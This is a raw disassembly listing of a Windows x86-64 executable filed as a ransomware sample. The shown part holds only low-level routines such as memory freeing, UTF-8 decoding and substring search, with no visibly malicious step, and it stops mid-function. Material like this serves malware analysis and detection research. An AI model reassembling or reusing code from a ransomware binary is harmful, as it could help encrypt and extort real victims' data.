
malware_samples/ransomware/ca3e83f9ce6b215baa2d930c7afb4f04e47683d6e198c9348af7fa96168054f6.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140001000 <.text>:
   140001000:	e9 6b 06 01 00       	jmp    0x140011670
   140001005:	cc                   	int3
   140001006:	cc                   	int3
   140001007:	cc                   	int3
   140001008:	cc                   	int3
   140001009:	cc                   	int3
   14000100a:	cc                   	int3
   14000100b:	cc                   	int3
   14000100c:	cc                   	int3
   14000100d:	cc                   	int3
   14000100e:	cc                   	int3
   14000100f:	cc                   	int3
   140001010:	48 8b 51 08          	mov    0x8(%rcx),%rdx
   140001014:	48 85 d2             	test   %rdx,%rdx
   140001017:	74 0e                	je     0x140001027
   140001019:	48 8b 09             	mov    (%rcx),%rcx
   14000101c:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140001022:	e9 f9 3d 00 00       	jmp    0x140004e20
   140001027:	c3                   	ret
   140001028:	cc                   	int3
   140001029:	cc                   	int3
   14000102a:	cc                   	int3
   14000102b:	cc                   	int3
   14000102c:	cc                   	int3
   14000102d:	cc                   	int3
   14000102e:	cc                   	int3
   14000102f:	cc                   	int3
   140001030:	55                   	push   %rbp
   140001031:	48 83 ec 40          	sub    $0x40,%rsp
   140001035:	48 8d 6c 24 40       	lea    0x40(%rsp),%rbp
   14000103a:	48 c7 45 f8 fe ff ff 	movq   $0xfffffffffffffffe,-0x8(%rbp)
   140001041:	ff 
   140001042:	80 39 02             	cmpb   $0x2,(%rcx)
   140001045:	73 06                	jae    0x14000104d
   140001047:	48 83 c4 40          	add    $0x40,%rsp
   14000104b:	5d                   	pop    %rbp
   14000104c:	c3                   	ret
   14000104d:	48 89 4d e8          	mov    %rcx,-0x18(%rbp)
   140001051:	48 8b 41 08          	mov    0x8(%rcx),%rax
   140001055:	48 8b 08             	mov    (%rax),%rcx
   140001058:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   14000105c:	48 8b 40 08          	mov    0x8(%rax),%rax
   140001060:	ff 10                	call   *(%rax)
   140001062:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
   140001066:	48 8b 41 08          	mov    0x8(%rcx),%rax
   14000106a:	48 8b 50 08          	mov    0x8(%rax),%rdx
   14000106e:	48 85 d2             	test   %rdx,%rdx
   140001071:	74 0c                	je     0x14000107f
   140001073:	48 8b 09             	mov    (%rcx),%rcx
   140001076:	4c 8b 40 10          	mov    0x10(%rax),%r8
   14000107a:	e8 a1 3d 00 00       	call   0x140004e20
   14000107f:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   140001083:	48 8b 48 08          	mov    0x8(%rax),%rcx
   140001087:	ba 18 00 00 00       	mov    $0x18,%edx
   14000108c:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   140001092:	48 83 c4 40          	add    $0x40,%rsp
   140001096:	5d                   	pop    %rbp
   140001097:	e9 84 3d 00 00       	jmp    0x140004e20
   14000109c:	0f 1f 40 00          	nopl   0x0(%rax)
   1400010a0:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   1400010a5:	55                   	push   %rbp
   1400010a6:	48 83 ec 20          	sub    $0x20,%rsp
   1400010aa:	48 8d 6a 40          	lea    0x40(%rdx),%rbp
   1400010ae:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   1400010b2:	48 8b 08             	mov    (%rax),%rcx
   1400010b5:	48 8b 50 08          	mov    0x8(%rax),%rdx
   1400010b9:	e8 72 00 00 00       	call   0x140001130
   1400010be:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   1400010c2:	48 8b 48 08          	mov    0x8(%rax),%rcx
   1400010c6:	e8 55 00 00 00       	call   0x140001120
   1400010cb:	90                   	nop
   1400010cc:	48 83 c4 20          	add    $0x20,%rsp
   1400010d0:	5d                   	pop    %rbp
   1400010d1:	c3                   	ret
   1400010d2:	cc                   	int3
   1400010d3:	cc                   	int3
   1400010d4:	cc                   	int3
   1400010d5:	cc                   	int3
   1400010d6:	cc                   	int3
   1400010d7:	cc                   	int3
   1400010d8:	cc                   	int3
   1400010d9:	cc                   	int3
   1400010da:	cc                   	int3
   1400010db:	cc                   	int3
   1400010dc:	cc                   	int3
   1400010dd:	cc                   	int3
   1400010de:	cc                   	int3
   1400010df:	cc                   	int3
   1400010e0:	48 8b 51 08          	mov    0x8(%rcx),%rdx
   1400010e4:	48 85 d2             	test   %rdx,%rdx
   1400010e7:	74 17                	je     0x140001100
   1400010e9:	48 c1 e2 03          	shl    $0x3,%rdx
   1400010ed:	48 85 d2             	test   %rdx,%rdx
   1400010f0:	74 0e                	je     0x140001100
   1400010f2:	48 8b 09             	mov    (%rcx),%rcx
   1400010f5:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   1400010fb:	e9 20 3d 00 00       	jmp    0x140004e20
   140001100:	c3                   	ret
   140001101:	cc                   	int3
   140001102:	cc                   	int3
   140001103:	cc                   	int3
   140001104:	cc                   	int3
   140001105:	cc                   	int3
   140001106:	cc                   	int3
   140001107:	cc                   	int3
   140001108:	cc                   	int3
   140001109:	cc                   	int3
   14000110a:	cc                   	int3
   14000110b:	cc                   	int3
   14000110c:	cc                   	int3
   14000110d:	cc                   	int3
   14000110e:	cc                   	int3
   14000110f:	cc                   	int3
   140001110:	c3                   	ret
   140001111:	cc                   	int3
   140001112:	cc                   	int3
   140001113:	cc                   	int3
   140001114:	cc                   	int3
   140001115:	cc                   	int3
   140001116:	cc                   	int3
   140001117:	cc                   	int3
   140001118:	cc                   	int3
   140001119:	cc                   	int3
   14000111a:	cc                   	int3
   14000111b:	cc                   	int3
   14000111c:	cc                   	int3
   14000111d:	cc                   	int3
   14000111e:	cc                   	int3
   14000111f:	cc                   	int3
   140001120:	ba 18 00 00 00       	mov    $0x18,%edx
   140001125:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   14000112b:	e9 f0 3c 00 00       	jmp    0x140004e20
   140001130:	48 89 d0             	mov    %rdx,%rax
   140001133:	48 8b 52 08          	mov    0x8(%rdx),%rdx
   140001137:	48 85 d2             	test   %rdx,%rdx
   14000113a:	74 09                	je     0x140001145
   14000113c:	4c 8b 40 10          	mov    0x10(%rax),%r8
   140001140:	e9 db 3c 00 00       	jmp    0x140004e20
   140001145:	c3                   	ret
   140001146:	cc                   	int3
   140001147:	cc                   	int3
   140001148:	cc                   	int3
   140001149:	cc                   	int3
   14000114a:	cc                   	int3
   14000114b:	cc                   	int3
   14000114c:	cc                   	int3
   14000114d:	cc                   	int3
   14000114e:	cc                   	int3
   14000114f:	cc                   	int3
   140001150:	55                   	push   %rbp
   140001151:	41 57                	push   %r15
   140001153:	41 56                	push   %r14
   140001155:	41 55                	push   %r13
   140001157:	41 54                	push   %r12
   140001159:	56                   	push   %rsi
   14000115a:	57                   	push   %rdi
   14000115b:	53                   	push   %rbx
   14000115c:	48 81 ec 38 03 00 00 	sub    $0x338,%rsp
   140001163:	48 8d ac 24 80 00 00 	lea    0x80(%rsp),%rbp
   14000116a:	00 
   14000116b:	48 c7 85 b0 02 00 00 	movq   $0xfffffffffffffffe,0x2b0(%rbp)
   140001172:	fe ff ff ff 
   140001176:	48 8d 15 13 04 02 00 	lea    0x20413(%rip),%rdx        # 0x140021590
   14000117d:	48 8d 8d b0 00 00 00 	lea    0xb0(%rbp),%rcx
   140001184:	41 b8 0c 00 00 00    	mov    $0xc,%r8d
   14000118a:	e8 31 04 01 00       	call   0x1400115c0
   14000118f:	83 bd b0 00 00 00 01 	cmpl   $0x1,0xb0(%rbp)
   140001196:	0f 85 41 01 00 00    	jne    0x1400012dd
   14000119c:	80 bd b8 00 00 00 02 	cmpb   $0x2,0xb8(%rbp)
   1400011a3:	72 4a                	jb     0x1400011ef
   1400011a5:	48 8b 85 c0 00 00 00 	mov    0xc0(%rbp),%rax
   1400011ac:	48 8b 08             	mov    (%rax),%rcx
   1400011af:	48 89 85 a0 02 00 00 	mov    %rax,0x2a0(%rbp)
   1400011b6:	48 8b 40 08          	mov    0x8(%rax),%rax
   1400011ba:	ff 10                	call   *(%rax)
   1400011bc:	48 8b b5 a0 02 00 00 	mov    0x2a0(%rbp),%rsi
   1400011c3:	48 8b 46 08          	mov    0x8(%rsi),%rax
   1400011c7:	48 8b 50 08          	mov    0x8(%rax),%rdx
   1400011cb:	48 85 d2             	test   %rdx,%rdx
   1400011ce:	74 0c                	je     0x1400011dc
   1400011d0:	48 8b 0e             	mov    (%rsi),%rcx
   1400011d3:	4c 8b 40 10          	mov    0x10(%rax),%r8
   1400011d7:	e8 44 3c 00 00       	call   0x140004e20
   1400011dc:	ba 18 00 00 00       	mov    $0x18,%edx
   1400011e1:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   1400011e7:	48 89 f1             	mov    %rsi,%rcx
   1400011ea:	e8 31 3c 00 00       	call   0x140004e20
   1400011ef:	48 8d 05 32 04 02 00 	lea    0x20432(%rip),%rax        # 0x140021628
   1400011f6:	48 89 85 b0 00 00 00 	mov    %rax,0xb0(%rbp)
   1400011fd:	48 c7 85 b8 00 00 00 	movq   $0x1,0xb8(%rbp)
   140001204:	01 00 00 00 
   140001208:	48 c7 85 c0 00 00 00 	movq   $0x0,0xc0(%rbp)
   14000120f:	00 00 00 00 
   140001213:	48 8d 05 1e 04 02 00 	lea    0x2041e(%rip),%rax        # 0x140021638
   14000121a:	48 89 85 d0 00 00 00 	mov    %rax,0xd0(%rbp)
   140001221:	48 c7 85 d8 00 00 00 	movq   $0x0,0xd8(%rbp)
   140001228:	00 00 00 00 
   14000122c:	48 8d 8d b0 00 00 00 	lea    0xb0(%rbp),%rcx
   140001233:	e8 88 8c 00 00       	call   0x140009ec0
   140001238:	48 8d b5 b0 00 00 00 	lea    0xb0(%rbp),%rsi
   14000123f:	48 89 f1             	mov    %rsi,%rcx
   140001242:	e8 19 78 00 00       	call   0x140008a60
   140001247:	48 89 f1             	mov    %rsi,%rcx
   14000124a:	b2 01                	mov    $0x1,%dl
   14000124c:	e8 3f 78 00 00       	call   0x140008a90
   140001251:	48 89 c1             	mov    %rax,%rcx
   140001254:	b2 01                	mov    $0x1,%dl
   140001256:	e8 55 78 00 00       	call   0x140008ab0
   14000125b:	48 89 c1             	mov    %rax,%rcx
   14000125e:	b2 01                	mov    $0x1,%dl
   140001260:	e8 3b 78 00 00       	call   0x140008aa0
   140001265:	4c 8d 05 24 03 02 00 	lea    0x20324(%rip),%r8        # 0x140021590
   14000126c:	48 8d 4d b0          	lea    -0x50(%rbp),%rcx
   140001270:	41 b9 0c 00 00 00    	mov    $0xc,%r9d
   140001276:	48 89 c2             	mov    %rax,%rdx
   140001279:	e8 42 78 00 00       	call   0x140008ac0
   14000127e:	48 8b 75 b8          	mov    -0x48(%rbp),%rsi
   140001282:	48 83 7d b0 01       	cmpq   $0x1,-0x50(%rbp)
   140001287:	75 1b                	jne    0x1400012a4
   140001289:	40 80 fe 03          	cmp    $0x3,%sil
   14000128d:	74 4e                	je     0x1400012dd
   14000128f:	48 8b 7d c0          	mov    -0x40(%rbp),%rdi
   140001293:	48 89 f3             	mov    %rsi,%rbx
   140001296:	48 0f ac fb 08       	shrd   $0x8,%rdi,%rbx
   14000129b:	48 c1 ef 08          	shr    $0x8,%rdi
   14000129f:	e9 a3 06 00 00       	jmp    0x140001947
   1400012a4:	48 89 b5 20 02 00 00 	mov    %rsi,0x220(%rbp)
   1400012ab:	48 8d 15 ea 02 02 00 	lea    0x202ea(%rip),%rdx        # 0x14002159c
   1400012b2:	48 8d 8d 20 02 00 00 	lea    0x220(%rbp),%rcx
   1400012b9:	41 b8 50 00 00 00    	mov    $0x50,%r8d
   1400012bf:	e8 8c 31 00 00       	call   0x140004450
   1400012c4:	48 89 c6             	mov    %rax,%rsi
   1400012c7:	40 80 fe 03          	cmp    $0x3,%sil
   1400012cb:	0f 85 5b 06 00 00    	jne    0x14000192c
   1400012d1:	48 8d 8d 20 02 00 00 	lea    0x220(%rbp),%rcx
   1400012d8:	e8 93 03 01 00       	call   0x140011670
   1400012dd:	48 8b 05 5c 02 02 00 	mov    0x2025c(%rip),%rax        # 0x140021540
   1400012e4:	48 89 85 70 02 00 00 	mov    %rax,0x270(%rbp)
   1400012eb:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400012ee:	0f 11 85 78 02 00 00 	movups %xmm0,0x278(%rbp)
   1400012f5:	48 8d 15 94 02 02 00 	lea    0x20294(%rip),%rdx        # 0x140021590
   1400012fc:	48 8d 8d b0 00 00 00 	lea    0xb0(%rbp),%rcx
   140001303:	41 b8 0c 00 00 00    	mov    $0xc,%r8d
   140001309:	e8 f2 73 00 00       	call   0x140008700
   14000130e:	83 bd b0 00 00 00 01 	cmpl   $0x1,0xb0(%rbp)
   140001315:	75 38                	jne    0x14000134f
   140001317:	0f 10 85 b8 00 00 00 	movups 0xb8(%rbp),%xmm0
   14000131e:	0f 29 45 b0          	movaps %xmm0,-0x50(%rbp)
   140001322:	48 8d 05 27 03 02 00 	lea    0x20327(%rip),%rax        # 0x140021650
   140001329:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000132e:	48 8d 0d 9b 01 02 00 	lea    0x2019b(%rip),%rcx        # 0x1400214d0
   140001335:	4c 8d 0d c4 01 02 00 	lea    0x201c4(%rip),%r9        # 0x140021500
   14000133c:	4c 8d 45 b0          	lea    -0x50(%rbp),%r8
   140001340:	ba 2b 00 00 00       	mov    $0x2b,%edx
   140001345:	e8 46 e6 01 00       	call   0x14001f990
   14000134a:	e9 d0 14 00 00       	jmp    0x14000281f
   14000134f:	0f 10 85 b8 00 00 00 	movups 0xb8(%rbp),%xmm0
   140001356:	0f 29 45 b0          	movaps %xmm0,-0x50(%rbp)
   14000135a:	48 8b 95 c8 00 00 00 	mov    0xc8(%rbp),%rdx
   140001361:	48 89 55 c0          	mov    %rdx,-0x40(%rbp)
   140001365:	48 8b 4d b0          	mov    -0x50(%rbp),%rcx
   140001369:	48 89 8d c8 01 00 00 	mov    %rcx,0x1c8(%rbp)
   140001370:	e8 1b 26 00 00       	call   0x140003990
   140001375:	48 89 95 50 02 00 00 	mov    %rdx,0x250(%rbp)
   14000137c:	48 c7 44 24 20 01 00 	movq   $0x1,0x20(%rsp)
   140001383:	00 00 
   140001385:	4c 8d 0d dc 02 02 00 	lea    0x202dc(%rip),%r9        # 0x140021668
   14000138c:	48 8d 8d b0 00 00 00 	lea    0xb0(%rbp),%rcx
   140001393:	48 89 c2             	mov    %rax,%rdx
   140001396:	4c 8b 85 50 02 00 00 	mov    0x250(%rbp),%r8
   14000139d:	e8 1e b4 01 00       	call   0x14001c7c0
   1400013a2:	4c 8b a5 b0 00 00 00 	mov    0xb0(%rbp),%r12
   1400013a9:	4c 8b bd b8 00 00 00 	mov    0xb8(%rbp),%r15
   1400013b0:	4c 8b 9d c0 00 00 00 	mov    0xc0(%rbp),%r11
   1400013b7:	48 8b b5 c8 00 00 00 	mov    0xc8(%rbp),%rsi
   1400013be:	48 8b 85 d0 00 00 00 	mov    0xd0(%rbp),%rax
   1400013c5:	48 89 85 b0 01 00 00 	mov    %rax,0x1b0(%rbp)
   1400013cc:	4c 8b b5 d8 00 00 00 	mov    0xd8(%rbp),%r14
   1400013d3:	48 8b 8d e8 00 00 00 	mov    0xe8(%rbp),%rcx
   1400013da:	48 8b 85 f0 00 00 00 	mov    0xf0(%rbp),%rax
   1400013e1:	48 89 85 f0 01 00 00 	mov    %rax,0x1f0(%rbp)
   1400013e8:	48 8b 85 f8 00 00 00 	mov    0xf8(%rbp),%rax
   1400013ef:	48 89 85 68 02 00 00 	mov    %rax,0x268(%rbp)
   1400013f6:	4c 8b ad 08 01 00 00 	mov    0x108(%rbp),%r13
   1400013fd:	48 89 c8             	mov    %rcx,%rax
   140001400:	48 89 8d 18 02 00 00 	mov    %rcx,0x218(%rbp)
   140001407:	48 25 00 ff ff ff    	and    $0xffffffffffffff00,%rax
   14000140d:	48 89 85 d0 01 00 00 	mov    %rax,0x1d0(%rbp)
   140001414:	4b 8d 04 3c          	lea    (%r12,%r15,1),%rax
   140001418:	48 89 85 c0 01 00 00 	mov    %rax,0x1c0(%rbp)
   14000141f:	48 8d 46 ff          	lea    -0x1(%rsi),%rax
   140001423:	48 89 85 08 02 00 00 	mov    %rax,0x208(%rbp)
   14000142a:	45 31 c0             	xor    %r8d,%r8d
   14000142d:	31 c0                	xor    %eax,%eax
   14000142f:	48 89 b5 88 02 00 00 	mov    %rsi,0x288(%rbp)
   140001436:	4c 89 9d b8 01 00 00 	mov    %r11,0x1b8(%rbp)
   14000143d:	eb 35                	jmp    0x140001474
   14000143f:	90                   	nop
   140001440:	48 8b 95 80 02 00 00 	mov    0x280(%rbp),%rdx
   140001447:	48 8b 85 70 02 00 00 	mov    0x270(%rbp),%rax
   14000144e:	4c 89 2c d0          	mov    %r13,(%rax,%rdx,8)
   140001452:	48 83 85 80 02 00 00 	addq   $0x1,0x280(%rbp)
   140001459:	01 
   14000145a:	49 89 f8             	mov    %rdi,%r8
   14000145d:	4c 8b 9d b8 01 00 00 	mov    0x1b8(%rbp),%r11
   140001464:	49 89 f5             	mov    %rsi,%r13
   140001467:	48 8b b5 88 02 00 00 	mov    0x288(%rbp),%rsi
   14000146e:	8b 85 a0 02 00 00    	mov    0x2a0(%rbp),%eax
   140001474:	84 c0                	test   %al,%al
   140001476:	0f 85 c7 05 00 00    	jne    0x140001a43
   14000147c:	48 83 bd b0 01 00 00 	cmpq   $0x1,0x1b0(%rbp)
   140001483:	01 
   140001484:	75 4a                	jne    0x1400014d0
   140001486:	49 83 fd ff          	cmp    $0xffffffffffffffff,%r13
   14000148a:	0f 84 29 02 00 00    	je     0x1400016b9
   140001490:	48 8b 85 08 02 00 00 	mov    0x208(%rbp),%rax
   140001497:	48 8b 95 68 02 00 00 	mov    0x268(%rbp),%rdx
   14000149e:	48 01 d0             	add    %rdx,%rax
   1400014a1:	b1 01                	mov    $0x1,%cl
   1400014a3:	89 8d a0 02 00 00    	mov    %ecx,0x2a0(%rbp)
   1400014a9:	4c 39 f8             	cmp    %r15,%rax
   1400014ac:	0f 83 06 03 00 00    	jae    0x1400017b8
   1400014b2:	44 0f b6 8d 18 02 00 	movzbl 0x218(%rbp),%r9d
   1400014b9:	00 
   1400014ba:	4c 0b 8d d0 01 00 00 	or     0x1d0(%rbp),%r9
   1400014c1:	49 89 f2             	mov    %rsi,%r10
   1400014c4:	4d 29 ca             	sub    %r9,%r10
   1400014c7:	e9 3d 01 00 00       	jmp    0x140001609
   1400014cc:	0f 1f 40 00          	nopl   0x0(%rax)
   1400014d0:	4c 8b 8d c0 01 00 00 	mov    0x1c0(%rbp),%r9
   1400014d7:	48 8b b5 18 02 00 00 	mov    0x218(%rbp),%rsi
   1400014de:	eb 06                	jmp    0x1400014e6
   1400014e0:	49 01 c6             	add    %rax,%r14
   1400014e3:	40 b6 01             	mov    $0x1,%sil
   1400014e6:	4d 85 f6             	test   %r14,%r14
   1400014e9:	74 16                	je     0x140001501
   1400014eb:	4d 39 f7             	cmp    %r14,%r15
   1400014ee:	74 11                	je     0x140001501
   1400014f0:	0f 86 2b 05 00 00    	jbe    0x140001a21
   1400014f6:	43 80 3c 34 bf       	cmpb   $0xbf,(%r12,%r14,1)
   1400014fb:	0f 8e 20 05 00 00    	jle    0x140001a21
   140001501:	4d 39 f7             	cmp    %r14,%r15
   140001504:	0f 84 b3 02 00 00    	je     0x1400017bd
   14000150a:	4b 8d 14 34          	lea    (%r12,%r14,1),%rdx
   14000150e:	0f b6 1a             	movzbl (%rdx),%ebx
   140001511:	0f b6 cb             	movzbl %bl,%ecx
   140001514:	84 c9                	test   %cl,%cl
   140001516:	0f 89 81 00 00 00    	jns    0x14000159d
   14000151c:	48 8d 42 01          	lea    0x1(%rdx),%rax
   140001520:	4c 39 c8             	cmp    %r9,%rax
   140001523:	74 3b                	je     0x140001560
   140001525:	0f b6 42 01          	movzbl 0x1(%rdx),%eax
   140001529:	48 83 c2 02          	add    $0x2,%rdx
   14000152d:	83 e0 3f             	and    $0x3f,%eax
   140001530:	89 cf                	mov    %ecx,%edi
   140001532:	83 e7 1f             	and    $0x1f,%edi
   140001535:	80 f9 e0             	cmp    $0xe0,%cl
   140001538:	72 35                	jb     0x14000156f
   14000153a:	4c 39 ca             	cmp    %r9,%rdx
   14000153d:	74 37                	je     0x140001576
   14000153f:	0f b6 0a             	movzbl (%rdx),%ecx
   140001542:	48 83 c2 01          	add    $0x1,%rdx
   140001546:	83 e1 3f             	and    $0x3f,%ecx
   140001549:	c1 e0 06             	shl    $0x6,%eax
   14000154c:	09 c8                	or     %ecx,%eax
   14000154e:	80 fb f0             	cmp    $0xf0,%bl
   140001551:	72 32                	jb     0x140001585
   140001553:	4c 39 ca             	cmp    %r9,%rdx
   140001556:	74 34                	je     0x14000158c
   140001558:	0f b6 0a             	movzbl (%rdx),%ecx
   14000155b:	83 e1 3f             	and    $0x3f,%ecx
   14000155e:	eb 2e                	jmp    0x14000158e
   140001560:	31 c0                	xor    %eax,%eax
   140001562:	4c 89 ca             	mov    %r9,%rdx
   140001565:	89 cf                	mov    %ecx,%edi
   140001567:	83 e7 1f             	and    $0x1f,%edi
   14000156a:	80 f9 e0             	cmp    $0xe0,%cl
   14000156d:	73 cb                	jae    0x14000153a
   14000156f:	c1 e7 06             	shl    $0x6,%edi
   140001572:	09 f8                	or     %edi,%eax
   140001574:	eb 25                	jmp    0x14000159b
   140001576:	31 c9                	xor    %ecx,%ecx
   140001578:	4c 89 ca             	mov    %r9,%rdx
   14000157b:	c1 e0 06             	shl    $0x6,%eax
   14000157e:	09 c8                	or     %ecx,%eax
   140001580:	80 fb f0             	cmp    $0xf0,%bl
   140001583:	73 ce                	jae    0x140001553
   140001585:	c1 e7 0c             	shl    $0xc,%edi
   140001588:	09 f8                	or     %edi,%eax
   14000158a:	eb 0f                	jmp    0x14000159b
   14000158c:	31 c9                	xor    %ecx,%ecx
   14000158e:	83 e7 07             	and    $0x7,%edi
   140001591:	c1 e7 12             	shl    $0x12,%edi
   140001594:	c1 e0 06             	shl    $0x6,%eax
   140001597:	09 f8                	or     %edi,%eax
   140001599:	09 c8                	or     %ecx,%eax
   14000159b:	89 c1                	mov    %eax,%ecx
   14000159d:	40 84 f6             	test   %sil,%sil
   1400015a0:	0f 85 36 02 00 00    	jne    0x1400017dc
   1400015a6:	81 f9 00 00 11 00    	cmp    $0x110000,%ecx
   1400015ac:	0f 84 3d 02 00 00    	je     0x1400017ef
   1400015b2:	b8 01 00 00 00       	mov    $0x1,%eax
   1400015b7:	81 f9 80 00 00 00    	cmp    $0x80,%ecx
   1400015bd:	0f 82 1d ff ff ff    	jb     0x1400014e0
   1400015c3:	b8 02 00 00 00       	mov    $0x2,%eax
   1400015c8:	81 f9 00 08 00 00    	cmp    $0x800,%ecx
   1400015ce:	0f 82 0c ff ff ff    	jb     0x1400014e0
   1400015d4:	81 f9 00 00 01 00    	cmp    $0x10000,%ecx
   1400015da:	b8 04 00 00 00       	mov    $0x4,%eax
   1400015df:	48 83 d8 00          	sbb    $0x0,%rax
   1400015e3:	e9 f8 fe ff ff       	jmp    0x1400014e0
   1400015e8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1400015ef:	00 
   1400015f0:	48 01 f2             	add    %rsi,%rdx
   1400015f3:	45 31 ed             	xor    %r13d,%r13d
   1400015f6:	48 8b 85 08 02 00 00 	mov    0x208(%rbp),%rax
   1400015fd:	48 01 d0             	add    %rdx,%rax
   140001600:	4c 39 f8             	cmp    %r15,%rax
   140001603:	0f 83 af 01 00 00    	jae    0x1400017b8
   140001609:	41 0f b6 04 04       	movzbl (%r12,%rax,1),%eax
   14000160e:	48 8b 8d f0 01 00 00 	mov    0x1f0(%rbp),%rcx
   140001615:	48 0f a3 c1          	bt     %rax,%rcx
   140001619:	73 d5                	jae    0x1400015f0
   14000161b:	4d 39 ee             	cmp    %r13,%r14
   14000161e:	4c 89 e9             	mov    %r13,%rcx
   140001621:	49 0f 47 ce          	cmova  %r14,%rcx
   140001625:	48 39 f1             	cmp    %rsi,%rcx
   140001628:	48 0f 47 f1          	cmova  %rcx,%rsi
   14000162c:	48 89 c8             	mov    %rcx,%rax
   14000162f:	90                   	nop
   140001630:	48 39 f0             	cmp    %rsi,%rax
   140001633:	74 3b                	je     0x140001670
   140001635:	48 8d 3c 10          	lea    (%rax,%rdx,1),%rdi
   140001639:	4c 39 ff             	cmp    %r15,%rdi
   14000163c:	0f 83 61 03 00 00    	jae    0x1400019a3
   140001642:	41 0f b6 1c 03       	movzbl (%r11,%rax,1),%ebx
   140001647:	48 83 c0 01          	add    $0x1,%rax
   14000164b:	41 3a 1c 3c          	cmp    (%r12,%rdi,1),%bl
   14000164f:	74 df                	je     0x140001630
   140001651:	4c 29 f2             	sub    %r14,%rdx
   140001654:	48 01 c2             	add    %rax,%rdx
   140001657:	45 31 ed             	xor    %r13d,%r13d
   14000165a:	48 8b b5 88 02 00 00 	mov    0x288(%rbp),%rsi
   140001661:	eb 93                	jmp    0x1400015f6
   140001663:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000166a:	00 00 00 
   14000166d:	0f 1f 00             	nopl   (%rax)
   140001670:	4c 89 f1             	mov    %r14,%rcx
   140001673:	48 8b b5 88 02 00 00 	mov    0x288(%rbp),%rsi
   14000167a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140001680:	49 39 cd             	cmp    %rcx,%r13
   140001683:	0f 83 73 01 00 00    	jae    0x1400017fc
   140001689:	48 83 c1 ff          	add    $0xffffffffffffffff,%rcx
   14000168d:	48 39 f1             	cmp    %rsi,%rcx
   140001690:	0f 83 4c 03 00 00    	jae    0x1400019e2
   140001696:	48 8d 04 11          	lea    (%rcx,%rdx,1),%rax
   14000169a:	4c 39 f8             	cmp    %r15,%rax
   14000169d:	0f 83 53 03 00 00    	jae    0x1400019f6
   1400016a3:	41 0f b6 1c 0b       	movzbl (%r11,%rcx,1),%ebx
   1400016a8:	41 3a 1c 04          	cmp    (%r12,%rax,1),%bl
   1400016ac:	74 d2                	je     0x140001680
   1400016ae:	4c 01 ca             	add    %r9,%rdx
   1400016b1:	4d 89 d5             	mov    %r10,%r13
   1400016b4:	e9 3d ff ff ff       	jmp    0x1400015f6
   1400016b9:	48 8b 85 08 02 00 00 	mov    0x208(%rbp),%rax
   1400016c0:	48 8b bd 68 02 00 00 	mov    0x268(%rbp),%rdi
   1400016c7:	48 8d 1c 07          	lea    (%rdi,%rax,1),%rbx
   1400016cb:	4c 39 fb             	cmp    %r15,%rbx
   1400016ce:	0f 83 31 01 00 00    	jae    0x140001805
   1400016d4:	49 39 f6             	cmp    %rsi,%r14
   1400016d7:	48 89 f0             	mov    %rsi,%rax
   1400016da:	49 0f 47 c6          	cmova  %r14,%rax
   1400016de:	49 8d 4e ff          	lea    -0x1(%r14),%rcx
   1400016e2:	48 39 f1             	cmp    %rsi,%rcx
   1400016e5:	0f 83 c6 01 00 00    	jae    0x1400018b1
   1400016eb:	b1 01                	mov    $0x1,%cl
   1400016ed:	89 8d a0 02 00 00    	mov    %ecx,0x2a0(%rbp)
   1400016f3:	44 0f b6 8d 18 02 00 	movzbl 0x218(%rbp),%r9d
   1400016fa:	00 
   1400016fb:	4c 0b 8d d0 01 00 00 	or     0x1d0(%rbp),%r9
   140001702:	eb 23                	jmp    0x140001727
   140001704:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000170b:	00 00 00 
   14000170e:	66 90                	xchg   %ax,%ax
   140001710:	48 01 f7             	add    %rsi,%rdi
   140001713:	48 8b 8d 08 02 00 00 	mov    0x208(%rbp),%rcx
   14000171a:	48 8d 1c 0f          	lea    (%rdi,%rcx,1),%rbx
   14000171e:	4c 39 fb             	cmp    %r15,%rbx
   140001721:	0f 83 e6 00 00 00    	jae    0x14000180d
   140001727:	41 0f b6 0c 1c       	movzbl (%r12,%rbx,1),%ecx
   14000172c:	48 8b 95 f0 01 00 00 	mov    0x1f0(%rbp),%rdx
   140001733:	48 0f a3 ca          	bt     %rcx,%rdx
   140001737:	73 d7                	jae    0x140001710
   140001739:	4c 89 f1             	mov    %r14,%rcx
   14000173c:	0f 1f 40 00          	nopl   0x0(%rax)
   140001740:	48 39 c1             	cmp    %rax,%rcx
   140001743:	74 2b                	je     0x140001770
   140001745:	48 8d 1c 39          	lea    (%rcx,%rdi,1),%rbx
   140001749:	4c 39 fb             	cmp    %r15,%rbx
   14000174c:	0f 83 6f 02 00 00    	jae    0x1400019c1
   140001752:	41 0f b6 14 0b       	movzbl (%r11,%rcx,1),%edx
   140001757:	48 83 c1 01          	add    $0x1,%rcx
   14000175b:	41 3a 14 1c          	cmp    (%r12,%rbx,1),%dl
   14000175f:	74 df                	je     0x140001740
   140001761:	4c 29 f7             	sub    %r14,%rdi
   140001764:	48 01 cf             	add    %rcx,%rdi
   140001767:	eb aa                	jmp    0x140001713
   140001769:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140001770:	4c 89 f6             	mov    %r14,%rsi
   140001773:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000177a:	00 00 00 
   14000177d:	0f 1f 00             	nopl   (%rax)
   140001780:	48 85 f6             	test   %rsi,%rsi
   140001783:	0f 84 97 00 00 00    	je     0x140001820
   140001789:	48 8d 0c 3e          	lea    (%rsi,%rdi,1),%rcx
   14000178d:	48 83 c1 ff          	add    $0xffffffffffffffff,%rcx
   140001791:	4c 39 f9             	cmp    %r15,%rcx
   140001794:	0f 83 73 02 00 00    	jae    0x140001a0d
   14000179a:	48 83 c6 ff          	add    $0xffffffffffffffff,%rsi
